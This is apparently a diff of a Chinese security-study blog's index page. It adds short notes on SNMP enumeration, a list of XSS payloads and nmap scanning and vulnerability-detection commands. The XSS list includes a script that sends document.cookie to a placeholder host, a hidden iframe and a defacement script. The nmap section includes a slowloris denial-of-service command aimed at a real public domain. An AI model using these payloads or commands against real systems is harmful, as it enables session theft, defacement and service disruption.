@@ -264,6 +264,156 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-SNMP扫描" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/04/SNMP扫描/" class="article-date">
+      <time datetime="2018-12-04T14:03:36.000Z" itemprop="datePublished">2018-12-04</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/04/SNMP扫描/">SNMP扫描</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><code>snmpwalk 127.0.0.1 -c public -v 2c</code></p>
+<p><code>snmpcheck -t 127.0.0.1</code><br><code>snmpcheck -t 127.0.0.1 -c private -v 2</code><br><code>snmpcheck -t 127.0.0.1 -w</code></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/04/xss/" class="article-date">
+      <time datetime="2018-12-04T13:29:22.000Z" itemprop="datePublished">2018-12-04</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/04/xss/">xss</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>使用场景：</p>
+<ul>
+<li>直接嵌入html: <code>&lt;script&gt; alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
+<li>元素标签事件： <code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></li>
+<li>图片标签： <code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
+<li>其他标签： <code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
+<li>DOM对象，篡改页面内容</li>
+</ul>
+<p>漏洞POC：</p>
+<ul>
+<li><code>&lt;script&gt; alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
+<li><code>&lt;a href=&quot;onclick=alert(&#39;xss&#39;)&quot;&gt;type&lt;/a&gt;</code></li>
+<li><code>&lt;img src=http://127.0.0.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
+<li><code>&lt;script&gt;window.location=&#39;http://127.0.0.1&lt;/script&gt;&#39;</code></li>
+<li><code>&lt;iframe SRC=&quot;http://127.0.0.1/victim&quot; height =&quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;script&gt;new image().src=&quot;http://127.0.0.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Banner" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -534,6 +684,7 @@
 <ul>
 <li>nmap -sU 192.168.1.1      扫描默认的1000个端口</li>
 <li>nmap 192.168.1.1 -sU -p 53</li>
+<li>nmap -F -sT -v 127.0.0.1 -F即扫描u最有可能开放的100个端口，-v获取扫描信息， -sT 使用tcp扫描</li>
 <li>nmap -iL iplist.txt -sU -p  1-200</li>
 </ul>
 <p>隐蔽端口扫描：</p>
@@ -560,6 +711,7 @@
 <p>nmap通过发送系列复杂的探测，依据相应特征signature</p>
 <ul>
 <li>nmap 127.0.0.1 -p 80 -sV</li>
+<li>nmap -sV –script unusual-port 127.0.0.1</li>
 </ul>
 <p>SMB扫描</p>
 <ul>
@@ -576,7 +728,43 @@
 <li>nmap -sA 127.0.0.1 -p 22     防火墙过滤检测功能</li>
 </ul>
 <p>WAF识别</p>
-<p>nmap 域名 –script=http-waf-detect.nse</p>
+<ul>
+<li>nmap 域名 –script=http-waf-detect.nse</li>
+</ul>
+<p>探测操作系统：</p>
+<ul>
+<li>nmap -O 127.0.0.1</li>
+<li>nmap -A 127.0.0.1</li>
+</ul>
+<p>漏洞探测：</p>
+<ul>
+<li>HTTP.sys 远程代码执行<ul>
+<li>nmap -sV –script http-vuln-cve2015-1635 127.0.0.1</li>
+</ul>
+</li>
+<li>IIS短文件泄漏<ul>
+<li>nmap -p8080 –script http-iis-short-name-brute 127.0.0.1</li>
+</ul>
+</li>
+<li>拒绝服务<ul>
+<li>nmap –max-parallelism 800 –script http-slowloris www.baidu.com</li>
+</ul>
+</li>
+<li>验证MySql匿名访问<ul>
+<li>nmap –script mysql-empty-password 127.0.0.1</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>端口扫描的状态</p>
+<ul>
+<li>open               端口开启，数据有到达主机，有程序在端口上监控</li>
+<li>closed             端口关闭，数据有到达主机，没有程序在端口上监控</li>
+<li>filtered           数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤</li>
+<li>unfiltered         数据没有到达主机，但是不能识别端口的当前状态</li>
+<li>open|filtered      端口没有返回值，主要发生在udp，ip，fin，null和xmas扫描中</li>
+<li>closed|filtered    只发生在ip，id ，idle扫描</li>
+</ul>
 
       
     </div>
@@ -864,144 +1052,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-DNS字典爆破" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/02/DNS字典爆破/" class="article-date">
-      <time datetime="2018-12-02T13:49:36.000Z" itemprop="datePublished">2018-12-02</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/02/DNS字典爆破/">DNS字典爆破</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>fierce -dnsserver 8.8.8.8 -dns xxx.com -wordlist  wordlist.txt</p>
-<p>dnsdict6 -d4 -t 16 -x xxx.com</p>
-<p>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 xxx.com -o xxx.xml  </p>
-<p>dnsmap xxx.com -w dns.txt</p>
-<p>dnsrecon -d xxx.com –lifetime 10 -t brt -D dnsbig.txt</p>
-<p>dnsrecon -t std -d xxx.com</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-DNS原理" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/02/DNS原理/" class="article-date">
-      <time datetime="2018-12-02T07:08:32.000Z" itemprop="datePublished">2018-12-02</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/02/DNS原理/">DNS原理</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>域名与 FQDN的区别</p>
-<p>域名记录  A、 C name 、 NS、 MX、 ptr</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
     </div>
 
       
